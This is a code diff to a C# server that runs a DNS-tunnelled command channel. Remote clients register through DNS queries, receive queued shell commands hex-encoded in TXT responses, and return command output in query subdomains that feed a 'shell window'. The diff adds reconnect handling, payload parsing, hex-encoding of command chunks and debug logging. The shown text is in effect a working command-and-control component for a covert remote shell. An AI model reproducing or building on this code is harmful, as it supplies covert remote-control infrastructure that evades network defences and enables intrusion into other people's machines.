@@ -25,6 +25,7 @@ namespace Server.Logic
         public event Action<int>? OnClientRemoved;
         public event Action<int>? OnClientCountChanged;
         public event Action<int, string>? OnDataReceived;
+        public event Action<int, string>? OnCommandResult;
 
 
         public void Start(int port, string domain, string logPath, string serverIp = "127.0.0.1")
@@ -121,16 +122,28 @@ namespace Server.Logic
                     if (packetType == "a" && dnsQuery.QueryType == 1)
                     {
                         LogMessage($"\n[Query] {queryName} from {remoteEP.Address}");
-                        LogMessage($"[Connect] Starting connection #{_clientManager.ClientCount + 1}");
-
-                        int connectionId = _clientManager.AddClient(remoteEP.Address.ToString());
                         
-                        // Initialize command queue for this connection
-                        lock (_commandQueues)
+                        // Check if client already exists by IP
+                        int existingId = _clientManager.GetConnectionIdByIp(remoteEP.Address.ToString());
+                        int connectionId;
+                        
+                        if (existingId > 0)
                         {
-                            if (!_commandQueues.ContainsKey(connectionId))
+                            LogMessage($"[Connect] Client already exists with ID #{existingId}");
+                            connectionId = existingId;
+                        }
+                        else
+                        {
+                            LogMessage($"[Connect] Starting connection #{_clientManager.ClientCount + 1}");
+                            connectionId = _clientManager.AddClient(remoteEP.Address.ToString());
+                            
+                            // Initialize command queue for this connection
+                            lock (_commandQueues)
                             {
-                                _commandQueues[connectionId] = new Queue<string>();
+                                if (!_commandQueues.ContainsKey(connectionId))
+                                {
+                                    _commandQueues[connectionId] = new Queue<string>();
+                                }
                             }
                         }
 
@@ -155,17 +168,40 @@ namespace Server.Logic
                         LogMessage($"\n[Query] {queryName} from {remoteEP.Address}");
                         string rest = parts.Length > 1 ? parts[1] : "";
                         
+                        LogMessage($"[Debug] Parsing Type C, rest: '{rest}'");
+                        
                         // Parse: c.packetNumber.offset.connectionId.hexData.domain
+                        // Need to extract domain first, then parse the rest
+                        // Format: packetNumber.offset.connectionId.hexData.<domain parts>
                         string[] cParts = rest.Split('.');
+                        LogMessage($"[Debug] Split into {cParts.Length} parts");
+                        
                         if (cParts.Length < 4)
                         {
+                            LogMessage($"[Error] Type C packet has only {cParts.Length} parts, need at least 4");
                             throw new DNSSyntaxException();
                         }
 
                         int packetNumber = int.Parse(cParts[0]);
                         int offset = int.Parse(cParts[1]);
                         int connectionId = int.Parse(cParts[2]);
+                        
+                        // HexData is everything between connectionId and domain
+                        // Find where domain starts by counting dots from the end
+                        int domainDots = _domain.Count(c => c == '.');
+                        int hexDataEndIndex = cParts.Length - domainDots - 1;
+                        
                         string hexData = cParts[3];
+                        // If there are more parts before domain, it's part of hexData
+                        if (hexDataEndIndex > 3)
+                        {
+                            for (int i = 4; i <= hexDataEndIndex; i++)
+                            {
+                                hexData += "." + cParts[i];
+                            }
+                        }
+                        
+                        LogMessage($"[Debug] Parsed - Packet: {packetNumber}, Offset: {offset}, ConnID: {connectionId}, HexLen: {hexData.Length}");
 
                         if (!_clientManager.ConnectionExists(connectionId))
                         {
@@ -183,6 +219,9 @@ namespace Server.Logic
                             
                             string decodedText = System.Text.Encoding.UTF8.GetString(decodedData);
                             LogMessage($"  => Chunk data: '{decodedText}'");
+                            
+                            // Trigger event for command result (to update shell window)
+                            OnCommandResult?.Invoke(connectionId, decodedText);
                         }
 
                         string responseIp = IPGenerator.CreateResponseIp(ResponseCode.OK);
@@ -192,12 +231,16 @@ namespace Server.Logic
                     else if (packetType == "p" && dnsQuery.QueryType == 16)
                     {
                         LogMessage($"\n[Query] {queryName} from {remoteEP.Address}");
+                        LogMessage($"[Debug] Query type: {dnsQuery.QueryType}, Expected: 16 (TXT)");
                         string rest = parts.Length > 1 ? parts[1] : "";
+                        LogMessage($"[Debug] Parsing rest: '{rest}'");
                         
                         // Parse: p.packetNumber.offset.connectionId.domain
                         string[] pParts = rest.Split('.');
+                        LogMessage($"[Debug] Split into {pParts.Length} parts");
                         if (pParts.Length < 3)
                         {
+                            LogMessage($"[Error] Not enough parts in Type P packet: {pParts.Length}");
                             throw new DNSSyntaxException();
                         }
 
@@ -215,6 +258,12 @@ namespace Server.Logic
                         string commandChunk = "";
                         lock (_commandQueues)
                         {
+                            LogMessage($"[Debug] Command queue exists: {_commandQueues.ContainsKey(connectionId)}");
+                            if (_commandQueues.ContainsKey(connectionId))
+                            {
+                                LogMessage($"[Debug] Commands in queue: {_commandQueues[connectionId].Count}");
+                            }
+                            
                             if (_commandQueues.ContainsKey(connectionId) && _commandQueues[connectionId].Count > 0)
                             {
                                 // Get or initialize chunk state
@@ -232,10 +281,14 @@ namespace Server.Logic
                                 if (chunkStart < state.fullCommand.Length)
                                 {
                                     int chunkLen = Math.Min(60, state.fullCommand.Length - chunkStart);
-                                    commandChunk = state.fullCommand.Substring(chunkStart, chunkLen);
+                                    string rawChunk = state.fullCommand.Substring(chunkStart, chunkLen);
+                                    
+                                    // Hex-encode the command chunk to preserve UTF-8 encoding
+                                    byte[] chunkBytes = System.Text.Encoding.UTF8.GetBytes(rawChunk);
+                                    commandChunk = Convert.ToHexString(chunkBytes);
                                     
                                     _commandChunkState[connectionId] = (state.fullCommand, state.totalChunks, offset + 1);
-                                    LogMessage($"  => Sending chunk {offset + 1}/{state.totalChunks}: '{commandChunk}'");
+                                    LogMessage($"  => Sending chunk {offset + 1}/{state.totalChunks}: '{rawChunk}' (hex: {commandChunk})");
                                 }
                                 else
                                 {
@@ -309,10 +362,20 @@ namespace Server.Logic
         {
             lock (_commandQueues)
             {
+                LogMessage($"[Debug] EnqueueCommand called for connection #{connectionId}");
+                LogMessage($"[Debug] Command queues count: {_commandQueues.Count}");
+                LogMessage($"[Debug] Queue exists for #{connectionId}: {_commandQueues.ContainsKey(connectionId)}");
+                
                 if (_commandQueues.ContainsKey(connectionId))
                 {
                     _commandQueues[connectionId].Enqueue(command);
-                    LogMessage($"[Command] Queued for connection #{connectionId}: '{command}'");
+                    LogMessage($"[Command] ✅ Queued for connection #{connectionId}: '{command}'");
+                    LogMessage($"[Debug] Queue now has {_commandQueues[connectionId].Count} command(s)");
+                }
+                else
+                {
+                    LogMessage($"[Command] ❌ ERROR: No command queue exists for connection #{connectionId}");
+                    LogMessage($"[Debug] Available connection IDs: {string.Join(", ", _commandQueues.Keys)}");
                 }
             }
         }
